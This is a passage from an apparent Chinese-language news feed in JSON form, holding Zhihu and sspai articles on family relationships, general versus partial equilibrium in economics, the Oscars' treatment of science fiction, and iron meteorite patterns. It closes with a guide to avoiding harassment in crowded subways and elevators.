所以你想要摆脱原生家庭的管制、压制和牵制，就要真正独立起来，任何事情都应该有自己的思考和判断，有做决定的能力，尤其是经济上不再啃老、不去依靠父母。</p>\n<p>当你可以自己去生活、去赚钱、去拥有自己的空间和时间时，你就能主动选择去远离原生家庭，就像剧中的苏明玉一样，强大到无人再可去肆意伤害，勇敢的活出自己想要的人生。</p>\n<p><strong><em>4、</em>重新梳理自己与父母的关系，认清家庭中的责任和位置</strong></p>\n<p><strong>家庭系统排列</strong>，是心理咨询与心理治疗领域一个新的家庭治疗方法，最初由德国心理治疗大师伯特.海灵格经 30 年研究发展起来的。</p>\n<p>我最近一直在研究和学习，包括也上了李中莹老师的相应课程（<strong>大家不需要去专门研究，这很费心力，有问题找我就好：）</strong>）。</p>\n<p>它强调家庭里面的序位排列，主要是父母、儿女、配偶等每个角色在家庭中的位置是否正确，也即每个人都要站在自己应该属于的位置，如果出现排列错位，这个家庭就会出现问题。</p>\n<p>海灵格发现“在家庭系统中，有一些隐藏着的、不易被我们觉察到的动力操控着家庭成员之间的关系和家族成员的命运。那就是‘爱的序位’”海灵格认为“爱与秩序的冲突，是所有悲剧的开始和终结”。</p>\n<p>家庭系统排列讲求的是爱的科学，一个家庭包括各种各样的关系，这些关系形成了一个庞大的系统，我们每个人身处其中都有所属的位置和顺序，承担着各自的职责和功能。</p>\n<p>许多原生家庭出现问题，很多都是爱的序位、彼此的责任和功能搞错了。</p>\n<p>比方说，<strong>海灵格指出的这两点在家庭中很有借鉴意义</strong>：</p>\n<p><strong>· 在伴侣关系中，先生和妻子的关系，优先于他们和孩子的亲子关系。</strong>但通常夫妻有了孩子后，他们照顾孩子胜过在伴侣之间表达爱意，这样就破坏了层级秩序，孩子会感到不自在，有压迫感。</p>\n<p><strong>· 只有当你的母亲无法照顾父亲时，你去照顾他，才是适当的。</strong>或者对他们说：如果你们需要我，我就会给你们适当的照顾。</p>\n<p>意识到这个问题，认清你们的爱与责任，找到你们的排位和顺序，很多问题也将会在这个过程中逐渐得到解决。</p>\n<p><strong><em>5、</em>找到真心待你的人，重新建构一个有爱的新生家庭</strong></p>\n<p>人的一生有两个家庭，<strong>原生家庭无从改变，新生家庭却可以重头来过。</strong></p>\n<p>原生家庭的影响，会在你的生命中留下很深的痕迹，但别忘记了，成年以后你还有第二次选择的机会。</p>\n<p>找一个真心待你的人，用他的真诚、你的真心去疗愈心灵的伤痕，慢慢的你就会相信爱、感受爱、理解爱，这份健康的爱，会帮助你淡忘并擦去原生家庭留在你精神上的伤痕。</p>\n<p>不过，<strong>前提是你在进入一段感情前请不要把自己当病人，把对方当救世主，将自己的人生完全寄托于另一半身上，是很容易造成下一段悲剧的发生</strong>。</p>\n<p>父母的影响或许会伴随着你的人生很长一段路途，但人生那么长，放下那些不美好的影响，改变那些消极的力量，又未尝不是人生的另一段启程。</p>\n<p>正如东野圭吾所说的那样，谁都想生在好人家，可无法选择父母，发给你什么样的牌，你就只能尽量打好它。</p>\n<p><strong>改变，是从放下开始，爱自己是从接纳不完美起，用一个健全的人格、全新的自己去迎接新的家庭，相信你的后半生一定会活出另一个更好的自己。</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/465576258\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737481"},{"title":"经济学有逻辑基础吗？","date":"2021-06-26 23:07:22","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-cdda7a572ffa13c6b7f96a82a64712ed_l.jpg?source=8673f162\"><span>司马懿，</span><span>三国英雄士，四朝经济臣</span>\n<a href=\"https://www.zhihu.com/question/266751427/answer/411388780\" hidden>阅读原文</a>\n</div>\n<div>\n<p>多谢 <a href=\"http://www.zhihu.com/people/20c9a89d053b286ab19ba02852dd01c2\">@倩文</a> 邀请。</p>\n<p>其实『经济学的逻辑基础』和题主在补充说明里面说的，我感觉是两个问题。因为『逻辑基础』可能是想表达某种学科自洽的观念，而一般均衡和局部均衡的推导是另外一个事情。前者更像是一个科学哲学的问题，暂且放在一边，在这里简单的谈谈第二个问题，就是为什么从一般均衡推导出局部均衡是困难的。</p>\n<p>我认为最根本的原因，是因为<strong>『一般均衡』并不是『局部均衡』的一般形式，而是两种在不同假设下的均衡形式。</strong>两者的关系并不像牛顿力学和相对论力学那样，前者是后者的在某种状态下的近似。但是一般均衡和局部均衡无论是中英文，都似乎在暗示着这一点。</p>\n<p>举个例子，假设全世界有很多城市，每个城市里面有一个被高度规制的公司，也就是说这个公司是 price taker. 每家公司都生产同样的面包。然后呢，每个城市都有固定数量的人，每个人提供固定数量的劳动力。个人的劳动力供给无弹性，但是人可以在不同城市自由迁移。</p>\n<p>因为人是自由迁移的，每个城市的公司又是一样的，那么我们可以认为均衡的时候，每个城市的工资必然是一样的，假定这个工资是 W0。</p>\n<p>现在问题来了，如果其中突然有一个城市，增加了一点工资税 T，会造成什么影响?</p>\n<p>在<strong>局部均衡</strong>分析的时候，逻辑是这样的：因为人口是自由流动的，所以均衡的时候，人们的税后工资必然还是和其他地方的工资一样都是 W0，否则所有人都会迁移到其他的城市去。那么也就是说，这个税虽然表面上加在劳动者的工资上，但是其实是加在了公司的身上，公司会发给劳动者 W0+T 的税前工资。</p>\n<p>这个就跟之前讨论的美国对奖学金加税一样，因为奖学金其实基本上就是学生能够接受的底线了，所以如果加税的话，是学校会为每个学生多出一些钱来弥补因为税来的损失，表面上是学生的负担增加了，但是其实真正负担的是学校。</p>\n<p>但是在<strong>一般均衡</strong>的框架下，某一个城市的工资税，不仅仅对本城市有影响，还可能会对其他城市的工资有一个间接的影响。所以局部均衡的假设“其他城市还是 W0”就要被推翻掉。这里我就不写计算过程了，直观上，最终的结果就是所有城市的工资都下降了一点点，计算结果也确实如此。当城市很多的时候，下降的工资从绝对比例上几乎可以忽略不计。</p>\n<p>但是，就这么一点点对单个城市来说，看起来可以忽略不计的工资下降，加起来之后，恰恰就等于税收的总额！也就是说在这种情况下，公司的利润其实是不变的，反而是所有城市的劳动者共同承担了某一个城市的工资税（还记得假设吧，劳动力供给毫无弹性^_^）。</p>\n<p>上面这个小例子已经可以说明，在同样的一个设定下，用一般均衡和局部均衡的方法甚至可以得出完全相反的结果了。在经济学的框架下，一般并不是由很多个局部组成的，而是通过内生化局部均衡中某些的外生变量所产生的，双方的设定不同，互相推导有困难也是正常的。即便是将来通过数学技巧，可以找出在某些巧妙的假设下，双方能够互相推导，但是这样的一篇 ECMA 更多的是一种智力上的挑战，而非对经济学这两个概念的颠覆。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/266751427\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737486"},{"title":"为什么科幻电影不受奥斯卡青睐？","date":"2021-06-26 23:07:13","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-58c132d42a818e9be0fbeaaf4f4d15f6_l.jpg?source=8673f162\"><span>托比章，</span><span>游戏制作人/科幻评论</span>\n<a href=\"https://www.zhihu.com/question/21528801/answer/689325662\" hidden>阅读原文</a>\n</div>\n<div>\n<p>奥斯卡，也就是学院奖，之所以叫学院奖是因为主办单位是美国电影艺术与科学学会，看这个名字就知道，艺术是在科学之前的。在 2014 年的时候洛杉矶时报做了一项调查， 6028 名学院奖评委中，94%是白人，76%是男性，评委的平均年龄是 63 岁。就是说这些评委大多是在 1940-1960 年代出生的, 这方面的因素可能对评委的意识形态还是有很大约束力的。</p>\n<p>科幻片第一次被提名最佳影片奖是 1978 年的星球大战，那是当年让全世界所有青年都激动不已的票房冠军，收 7 亿 7 千 5 百万美元，但是最后获奖的是票房只有三千八百万美元的生活片《安妮·霍尔》。捶胸顿足吧。 但是当时，科幻片已经成为美国票房的重要组成部分，不可忽视。但是学院是很不情愿把包括最佳影片，最佳导演，最佳摄影这些重要项目办法给这种小青年才喜欢看的东西，在那些老一辈艺术家眼里面这些东西都是不入流的。 但学院又要给资本家们有所交代，那还是要办事，但是最佳影片和最佳导演是老前辈的底线。</p>\n<p>【第三类接触就在星战同一届上得了最佳摄影奖。】</p>\n<p>在这之前，科幻片通常都是在最佳视觉效果这个奖项上，比如 1968 年的《2001：太空奥德赛》可以说是和星战一样属于科幻史上的里程碑作品，但不管你怎么觉得，对于奥斯卡评委来说这就算不上电影艺术，给一个视觉效果安慰一下， 。还不要提最佳视觉效果是 1964 年才独立出来成为一个单独的奖项的，之前是叫做最佳特效，这个奖项是包含了音效和特效两部分。1950 年的《目标月球》Destination Moon 以及 1953 年的《世界大战》都获得了这个奖项，不过很多都是以特别成就奖的形式办法，都还不算做正式奖项。</p>\n<p>科幻片这种电影想要在奥斯卡拿个奖真是很难，尽都是最佳特效， 偶尔一个最佳摄影，音效，还有就是像希斯莱杰，追认。不光是科幻， 奇幻片恐怖片， 都是属于这个区间里面，一直被提名，一个正规奖项没有。直到 04 年的指环王获得最佳影片奖，不光是奇幻粉丝喜极而泣，也让让那些在星战，ET，侏罗纪公园，黑客帝国一路臭骂学院奖的科幻迷感受到了莫大的安慰。2016 年的《降临》，独树一帜，可能是近十年以来最有深度的科幻片，包括最佳影片奖，最佳导演奖在内 8 项提名，最后就拿走一个视觉特效（勘误: 此处应是 89 界的最佳音效剪辑）。所以我觉得，指环王得奖是奇幻片一个安慰奖，在那之后应该还要给科幻片也颁发一个安慰奖。</p>\n<p>安德烈塔克夫斯基是苏联以及全世界电影历史上的一个殿堂级人物，在他拍摄的为数不多的几部影片中就有两部科幻片， 比起《追踪者》来说我更喜欢他的另一部科幻片《索拉里斯》。当年莫斯科也是把这部电影作为对抗西方资本主义科幻电影太空奥德赛的强有力反击。塔克夫斯基本人也不喜欢 Kubrik 的史诗科幻电影，他的评价是：“这是一部毫无生气，充满心机和虚荣做作的电影。” 。但塔克夫斯基也不喜欢自己拍的索拉里斯，其实他就不喜欢幻片，甚至类型电影的概念。 在 1970 年的一次采访中， 安德烈塔克夫斯基对记者谈到“出于某种原因，现在所有的科幻电影中，导演都想要强迫观众去仔细鉴赏未来的物质世界。更有一些，比如 Kubrik 之流，他们把自己的电影称作预言。这简直让人难以置信！ 2001 太空奥德赛在很多地方都太假了，对于真正的电影艺术，这些虚假的东西必须要被消灭。” 我认为这是非常有思考意义，我们今天的科幻片展现给观众的，就是各种应接不暇的特技，只求痛快，但是影片的意义却无从寻找，或者根本就没有人关心。在《雕刻时间》一书中，塔可夫斯基评价自己的科幻电影时这么写到 “不幸的是，索拉里斯中的科幻元素太强烈了，对于观众来说已经是一种干扰………… 史坦尼斯劳·莱姆（Stanisław Lem）笔下的那些空间站，火箭，制作展现出来确实都是非常有趣的东西；但是对于我来说，现在看来，我觉得如果我们能这些东西都去除掉，电影的本意和要传达的信息应该更加鲜明地凸现出来。”</p>\n<p>另外还有一个就是导演或者据本身的有会员属性。《指环王：王者归来》确实是非常罕见的组合了。这篇文章实际上是《水形物语》得奥斯卡奖之前写的，因为觉得 Arival 也没有得奥斯卡奖，你一个吃鸡蛋的橡皮怪，就算导演有路子………………</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/21528801\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737494"},{"title":"铁陨石的纹理真的无法人造吗？","date":"2021-06-26 23:07:05","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-fe16995e003ace9e8e1d2cfb14cbcae7_l.jpg?source=8673f162\"><span>Nantan，</span><span>天降陨石于斯人。</span>\n<a href=\"https://www.zhihu.com/question/461294145/answer/1913590032\" hidden>阅读原文</a>\n</div>\n<div>\n<p>不完全是。</p>\n<p>按照常规的理解，铁陨石中能被称为“纹理”的结构有维斯台登构造（Widmanstätten pattern）和纽曼线（Neumann lines）。前者无法人工制造，但后者可以。</p>\n<p>找了一圈没找着同时拍到维斯台登纹和纽曼线的陨石照片，只能拿自己的开刀了，原谅我的渣渣拍照技术。。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-5556220454094edbf23f09e12b892901_720w.jpg?source=8673f162\" alt=\"\"><figcaption>条带状的交错纹理是维斯台登构造。颜色稍亮的斑块是铁纹石，上面发丝般的纹理就是纽曼线。拍摄材料是南丹（Nantan）铁陨石。</figcaption></figure><p>维斯台登构造的形成取决于铁陨石的化学成分和陨石母体中 Fe-Ni 熔体的冷却速率。是铁陨石母体在冷却过程中，铁纹石（α- 铁，铁的同素异形体之一，体心立方点阵）沿着镍纹石（γ- 铁）的特定晶面生长形成的。一般长这样：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cf461dd492ed823c0c6829ecda707bfb_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-aae880e39658bc47cbc317e3bd9e78aa_720w.jpg?source=8673f162\" alt=\"\"></figure><blockquote>1- 铁纹石；2- 镍纹石；3- 合纹石（铁纹石和镍纹石的混合物）；4- 氧化物和其他陨石矿物。</blockquote>\n<p>铁陨石那样厘米级尺寸的维斯台登构造确实无法在实验室制造，原因在于形成这种金相需要铁陨石的母体以极其缓慢的速率冷却。虽然不同铁陨石的冷却速率相差甚远，但通常在 1~100℃/ 百万年的区间内。人类发明时光机之前可没寿命在实验室里等这么一块玩意儿冷却。</p>\n<p>研究人员模拟铁陨石冷却时使用了 6.88wt%Ni 和 0.49wt%P 的铁合金，并以 5℃/ 天的冷却速率从 790℃降到 650℃，结果形成的维斯台登构造中的铁纹石晶体（下图的 K）只有几微米宽。远达不到铁陨石里肉眼可见的大尺寸铁纹石晶体的水平。<sup>[1]</sup></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-9d889dceebc7981424b65bb9a055709f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>6.88wt%Ni 和 0.49wt%P 的模拟铁陨石以 5℃/ 天的速率冷却，透射电镜图。</figcaption></figure><figure><img src=\"https://pic4.zhimg.com/v2-6dab960c45dd3a5e32bd11445c6090bc_720w.jpg?source=8673f162\" alt=\"\"><figcaption>9.8wt%Ni-0.3wt%P 的铁合金冷却至 650℃的实验，形成的维斯台登构造。反射光显微图。</figcaption></figure><p>下图为 Gibeon 铁陨石的维斯台登构造，可以对比一下晶体尺寸差距。</p>\n<p>（Gibeon 铁陨石在结构分类上属于细粒八面体铁陨石，维斯台登纹比刚才拍的粗粒八面体 Nantan 要细得多，铁纹石晶体很窄，不能直接肉眼观察纽曼线。）</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-16276b3517e09077d117a3137f25ad37_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-8e3a3767f5aacce58e3ec57837d66bd5_720w.jpg?source=8673f162\" alt=\"\"><figcaption>https://doi.org/10.1016/j.actamat.2005.11.008</figcaption></figure><blockquote>K：铁纹石；T：镍纹石；P：合纹石；N：纽曼线。</blockquote>\n<p>也许你能在某购物平台上看到个别有怪异“维斯台登纹”的“铁陨石”，那些大多只是在铁块表面磨砂或者部分哑光处理的玩意，用砂纸磨去就没了，而且做工十分蹩脚，甚至不能称之为仿造。（铁陨石的维斯台登纹用砂纸磨去后，重新酸洗就能重现）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1127f93d9b446466b1797c1ad06e7d98_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图片来自某宝。</figcaption></figure><p>至于纽曼线，它的形成条件就没有维斯台登纹那么苛刻了。纽曼线是铁纹石受到冲击形成的，代表了机械双晶的 Fe-Ni 微薄页理，体心铁纹石中双晶面为（112）。<sup>[2]</sup>而小行星之间偶尔也会“撞车”，冲击变质也是陨石中的常见现象。</p>\n<p>人为制造的纽曼线在夏比冲击试验就能做到。</p>\n<blockquote>夏比冲击试验是用以测定金属材料抗缺口敏感性(韧性)的试验。制备有一定形状和尺寸的金属试样，使其具有 U 形缺口或 V 形缺口，在夏比冲击试验机上处于简支梁状态，以试验机举起的摆锤作一次冲击，使试样沿缺口冲断，用折断时摆锤重新升起高度差计算试样的吸收功。</blockquote>\n<figure><img src=\"https://pic2.zhimg.com/v2-102e8d55aeab6ce558d12e7cb2525b61_720w.jpg?source=8673f162\" alt=\"\"><figcaption>纽曼线只在样品与试验设备支架接触的区域产生，而此区域在冲击过程中压缩应力最高。</figcaption></figure><p>所以铁陨石的纹理，无论是维斯台登纹还是纽曼线，都是可以人工制造的。但前提是有足够的寿命，所以要研究怎么制作假陨石，最好先研究如何长生不老。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/461294145\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737492"},{"title":"钉住那只「咸猪手」：写给非专业人士的狭小空间迷惑行为防范指南","date":"2021-06-26 06:32:34","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>本文是<a href=\"https://sspai.com/post/67083\" target=\"_blank\">《盯紧那个嫌疑人：写给非专业人士的尾随跟踪防范指南》</a>一文的后续。</p>\n<p>在上一篇文章中，笔者讨论了在一般城市环境——尤其是夜间 + 开阔室外——遭遇尾随、跟踪（Stalking）以及后续的靠近侵害行为，以及对这类行为的防范。在文章发出后，一名读者提出了一个略有抬杠嫌疑的问题：</p>\n<blockquote><p>你（指作者）坐过地铁吗？</p></blockquote>\n<p>言下之意或许是想说，笔者提出的「安全气泡」在高峰时段的地铁之类人群拥挤、空间狭窄的环境中并不适用；或许还带有一些「何不食肉糜」的指责意味。</p>\n<p>笔者之前在北京生活了十一年，在不同的时间段坐过北京地铁的每一条线路。在 2014-2017 年间，笔者在每个工作日的早高峰都要乘坐北京地铁 13 号线，途经立水桥至上地区间，并在停靠西二旗站时承受上车人潮的汹涌冲击。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/18/dec4e4b2d59c345ea03a71c1f2339b79.jpeg\"><figcaption>即使这么挤，携带非管制（合法）的防身武器仍然是可能的</figcaption></figure><p>必须承认，身材较瘦小的人士在这种环境下完全可能被挤到「双脚离地」，被旁人的肩膀「架」在空中；头发挤乱、随身物品挤扁、鞋子挤掉……都是有可能发生的事。在这种环境下，想要保持 2 米以上的「安全气泡」当然不可能，想提前识别、发现对方并提前预防阻止也非常困难。然而「在场景 A 适用的工具不能在场景 B 生效」不是再正常不过的现象吗？在开阔环境下的防范法则不适用于狭小空间，就意味着这些防范法则是空谈吗？这样的断论，恕笔者绝对不能够认同。</p>\n<p>当然，退一万步说，即使不是为了争论，痴汉、偷拍、狭小空间（如电梯）内的骚扰等行为目前也逐渐常见起来。那么，我们就跟随上一篇文章，将场景从开阔的室外转到人群密集的狭小环境，特别是地铁/公交车厢、电梯等室内空间，继续讨论「如何防范在这些场景下的骚扰行为」吧。</p>\n<p>为了方便行文，笔者在下文中将总是以地铁车厢为例。根据实际情况，相关建议也适用于公交、电梯、扶梯、密集队列等环境。</p>\n<h2>讨论的前提：「无法预防」与「时间线」</h2>\n<p>马伽术里有一个概念叫做「时间线」：从我们发现危险到危险真正「触及」我们，中间的时间越长，我们越有可能成功规避危险。这个概念与笔者之前述及的安全气泡是一致的。马伽术的时间线将我们能做出的反应分为五个等级：</p>\n<p>1. 回避：危险距离我们足够远，以至于我们可以直接远离，无需特殊的反应。</p>\n<p>2. 逃跑：危险发生在较近的地方，但我们只要刻意逃走，对方仍然无法追上我们。</p>\n<p>3. 预防阻止：危险稍微靠近，但我们能抢在对方之前做出反应，及早迫使对方后退，然后逃走。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/18/37c1325b4927d359292ed3ee0bfc528b.JPG\"></figure><p>这里允许我们「逃跑」的距离等于「第二气泡」，「预防阻止」则对应于「第一气泡」。如果危险位于第一气泡内，那么视我的反应速度和对方攻击的速度，就会有：</p>\n<p>4. 防御或解脱：我在第一时间识破对方的意图，化解其攻击；例如，对方刚刚出手要摸我的胸，我挡开对方的手，并将其推开。或者：</p>\n<p>5. 延迟解脱：我未能在第一时间化解对方的攻击，对方继续攻击，我在很不利的情况下仍然挣扎着做出反应；例如，我低头玩手机，身后有人抱住我，并开始摸胸猥亵。我过了一秒钟反应过来，开始尝试挣脱。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/18/197c06bf2a875cb6695eac9cac6a86da.jpg\"><figcaption>一个延迟解脱的例子：在这个位置上如果再次防御失败，就是一个「死」字了</figcaption></figure><p>延迟解脱一旦失败，后果即不可预料，至少也会给受害者的身心造成相当的伤害。试想，某人揪住你的头发，以不够致命的力量「轻轻地」扇耳光，并口出恶言进行羞辱；你未能挣脱，被对方欺负了十分钟，而且周围有不少人围观……</p>\n<p>这样的伤害需要多长时间、多少金钱和其他资源才能弥补呢？还请务必想尽方法，避免让自己落入这样的境地吧。</p>\n<p>「人群密集的狭小环境」最大的特点就是「无法清空身边的气泡」和「很难与潜在威胁保持足够距离」。在早高峰的地铁车厢里，2 米范围的「第一气泡」里至少会存在两位数的他人，与我们直接产生身体接触的人可能至少有 3-4 名。回避和逃跑是不可能的。若突然有人突然发难，我们也很难「预防阻止」，甚至难以在第一时间做出防御或解脱。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/18/5fbe6b56d878f9981a34c1e632ab5a0e.png\"><figcaption>第一气泡已经挤满了人，第二气泡则根本看不见</figcaption></figure><p>所幸的是，只要身在国内，且地铁的安检机制运转正常，那么恐怖袭击、无差别持刀攻击、泼撒危险液体、纵火、绑架……发生的概率都很低。我们需要（或者说能够）提防的，就只剩下扒窃、猥亵、偷拍和一般肢体攻击等几种侵害行为。</p>\n<p>厘清了这些前提后，笔者便可以放心地告诉各位：即使在这样不利的环境下，对付这样的侵害者，我们仍然可能做到一定程度的预防阻止、防御和延迟解脱，而不必然是坐以待毙、最终受害。欲知详情，就请各位继续阅读下面的几条对策罢。</p>\n<h2>对策之一：严防死守，监控第一气泡</h2>\n<p>地铁的电梯、扶梯和台阶都存在高度差。地铁车厢（特别是高峰时段）不可避免存在拥挤。这种环境客观上为偷拍、猥亵和扒窃提供了便利。那么，衣着适度贴身、避免过于暴露，将背包或挎包放在身体的前侧，就是最基本的常识。女士若特别担心遭到裙下偷拍，还应该考虑在夏季穿着打底裤或安全裤。</p>\n<p>穿鞋也要留意。人字拖、「踩扁后跟当拖鞋穿」的鞋子和露趾凉鞋都是相对不合适挤地铁的。它们不跟脚，容易掉落，在特别拥挤时还容易被踩踏致伤。身材较瘦弱的女士也要避免高跟鞋，否则被人架着肩膀、挤到悬空的时候，你会发现想站稳不摔倒都很难，就更不易有余裕抵抗流氓了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/18/b7fc271afd7e1e9dcadb7d6521916756.jpeg\"><figcaption>图片转自知乎。这样的鞋（或穿法）约等于拖鞋，并不利于安全</figcaption></figure><p>这里必须说一句，笔者并不反对人的爱美（或偷懒）之心，只是主张穿着和装备要适切于环境。如果必须挤地铁和公交通勤，最好将「安全」的优先级置于「美感」「舒适」之前，多一点防范措施为好。</p>\n<p>虽然人流拥挤，不能清空「第一气泡」，但我们至少可以密切监视进入第一气泡范围内的每个人。尽可能转动身体进行观察扫视，或者利用周围的反光物体（如车窗、镜子、广告牌和电梯门）观察情况，都是必要之举。为了做到这一点，就不能低头玩手机或读书，也不可以双耳都戴着耳机听音乐。</p>\n<p>如果在观察过程中发现有人不怀好意地凝视着你，或者神态 / 体态有过于明显的攻击性，又或者此人正在刻意向靠近你的方向挤过来，那就是潜在危险的标志。因为人群密集，除了视觉，我们还可以通过气味甄别危险。酒味、疏于洗澡的体臭、过于强烈的口臭，或者不明化学品的刺鼻味道……都意味着潜在的危险。</p>\n<p>发现这类危险后，你可以稍稍移动位置，和对方尽量拉开一点距离。最简单的办法是要求和周围的某个人「换一下位置」。若在此之后，那个危险分子继续挤开人群向你靠近，你就应该转过身、正面盯着 TA，做好进一步的准备：现在你应该明白为什么笔者建议「穿着便于移动的鞋子」并且「将随身的包背在身体前面」了吧。</p>\n<h2>对策之二：向安全地流动</h2>\n<p>兵法有云：地形者，兵之助也。我们应当时刻观察所处环境中的地形地物，始终让自己处于较有利、较安全的位置上。一般的地铁里无法强制设置「女性专用」车厢，「女性优先」车厢里男性多于女性的情况也时有发生。有些女性优先车厢的空调温度又嫌太高。总之，即使身为女性，也不能因为选择了女性车厢就麻痹大意。</p>\n<p>西科姆公司（SECOM）官网上的「痴汉对策」认为，地铁车厢中有两类位置需要格外警惕：</p>\n<ol>\n<li>靠近大型车站出入口 / 换乘口的车厢，以及车门旁边的位置：在这些位置上出现的痴汉，在得手后有较充足的逃跑机会。</li>\n<li>车厢的四个角以及两节车厢的连接处：位于这些地方的受害者没有退路，而且不容易被其他乘客留意到。</li>\n</ol>\n<p>既然如此，我们就应当尽量避免处在这些位置，在遇到可疑分子时也要避免向这样的位置运动。车厢中部、两侧座椅之间的位置就好一些。若处于站姿，因为四周都是人，需要多观察扫视。如果能坐下来，只需要把随身的包抱在胸前，就已经相当安全了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/18/2a850e7cffdf9adac581ed5d69a13c93.png\"></figure><p>上图中蓝色标记的位置如果有挡板，那么位于门边的、以绿色点标出的位置也是相对安全的。此时只要确保正面没有危险人士，就可以安全地缩在此处，而无需担心被上下车的人潮挤走。不过笔者认为最好的位置还是图中位于中央的、以圆圈标出的栏杆周围。体格较瘦小的人士可以设法移动到此处，抓紧栏杆作为依托，至少可以保证自己的一个方向与他人部分隔开。</p>\n<p>笔者当年乘坐北京地铁 13 号线时就采取了这样的策略。在列车到达西二旗站之前移动到这个栏杆周围，倚靠或抱住栏杆，让西二旗站汹涌的上下车人潮从身边挤过。待列车启动后，迅速靠近门口（通常只需要换 1-2 次位置就可以），以便顺利地在上地站下车。</p>\n<p>乘坐公交车时的安全地与地铁车厢类似。若是换成厢式电梯，那么最安全的地方当然是门两侧的角落，犹以靠近控制按钮的一侧为佳。在进入电梯后，背靠着电梯厢壁，让楼层按钮位于身体侧面，再把随身行李抱在胸前，就是非常安全的姿势。若感到不安，你可以迅速按下最近一层的按钮，提前离开电梯。要是已经遭到袭击，还可以立刻按下「紧急停梯」按钮。</p>\n<p>总之，就是要让自己时刻处在尽可能安全的位置。</p>\n<p>以上两条对策便是在狭小空间的螺蛳壳里做道场、帮助大家做些预防阻止的工作。做到这两点，我们应该可以在人生的大部分时候躲开这些「痴汉」，使得他们更倾向于选择其他人作为下手的对象。但人生无常，也许在某些时刻，我们忽然发现自己就是那个受害者：有手机伸入自己裙下正在拍照，或者有手或其他身体部位正在自己身上摩擦……此时无论多么厌恶、惊恐、害怕，我们都必须立即做出防御或延迟防御的反应——那就过渡到下面的第三个对策了。</p>\n<h2>对策之三：反应最大化 vs. 层层升级</h2>\n<p>如果不法侵害已经在进行过程中，笔者建议的行动原则就只有一个：<strong>第一时间的「反应最大化（Maximization）」</strong>。</p>\n<p>不法分子在实施侵害时常见的策略叫做「层层升级（escalation）」。例如，先伸出一根手指假装无意触碰对方的身体，对方没有反应，就变成两根手指，直到整只手。如果对方反应不够强，就将其解读为「半推半就」，继续以更大的动作进行侵犯。……如此一再升级，直至最后。</p>\n<p>从心态上来说，不法分子一定自认为在「权力地位」上优于加害对象，认定对方不敢或不能做出有效的反抗；经过一些试探，发现对方确实没有强烈的反抗，TA 就会更坚信自己最初的观念，在行为上也会更加肆无忌惮。</p>\n<p>作为回应，我们只要确认不法侵害行为正在发生中，无论对方「只是刚开始试探」还是「已经在升级」，都要在第一时间做出最大限度的回应——既体现为肢体动作，也体现为言语。</p>\n<p>例如前面的场景：我低头玩手机，身后有人抱住我，并开始摸胸猥亵。我过了一秒钟才反应过来，确认这是猥亵，就要连续攻击，迫使对方后退，然后转过身面对 TA、并掏出随身携带的武器。</p>\n<p>（只靠笔者自己实在无法拍出「被众人挤在中间」的局促感，所以这里还是不附动图了）</p>\n<p>在此过程中我还要大声喝骂：伸手抱住我还摸我的胸，<strong>你这个不要脸的臭流氓！</strong>然后转向周围的人，请他们协助报警，一起将不法分子抓住并扭送至公安机关。</p>\n<p>低头玩手机是一个糟糕的习惯。如果可以，我们不应该低头玩手机，而应该多观察扫视周围的情况，在察觉到可能有危险时，就把随身携带的武器提前取出、握在手里。若如此，我第一时间攻击对方时就不是用手机，而是战术笔或者战术手电。</p>\n<p><a href=\"https://sspai.com/post/60832\" target=\"_blank\">扩展阅读：</a><a 